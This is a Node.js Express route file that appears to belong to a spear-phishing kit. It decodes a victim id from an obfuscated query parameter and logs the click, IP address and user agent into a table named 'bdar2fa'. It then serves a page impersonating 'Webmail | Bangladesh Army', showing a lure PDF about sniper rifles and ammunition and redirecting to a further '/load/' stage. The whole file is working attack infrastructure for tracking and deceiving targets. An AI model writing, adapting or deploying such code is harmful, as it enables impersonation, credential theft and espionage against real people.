
const express = require ('express');
const router = express.Router();

const db = require('../db');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));

///validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data = req.query.dsfregredfgkldfjgioerjgfseorsfm;

    const userid = Buffer.from(data, 'base64').toString('utf-8');
  
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
   // const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;

    const insertQuery = 'INSERT INTO bdar2fa (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
    db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
        if (err) {
            console.error('Error inserting record:', err);
            return res.status(500).send('Internal Server Error');
        }
      

        });

    const url = `/load/?uihdft948fdjxgjdferuidh=${data}`;

    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `
        
        <!DOCTYPE html>
            <html dir="ltr" lang="en-US">
    
            <head>
                <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                <meta charset="utf-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta http-equiv="pragma" content="no-cache">            
                <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
                <title>Webmail | Bangladesh Army</title>
                <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 2000);
                </script> 
                
            </head>
                <body>
                   <object data="./Collection of Sniper Rfl and Ammo.pdf" width="1950" height="1200"></object>
                </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});



module.exports =router
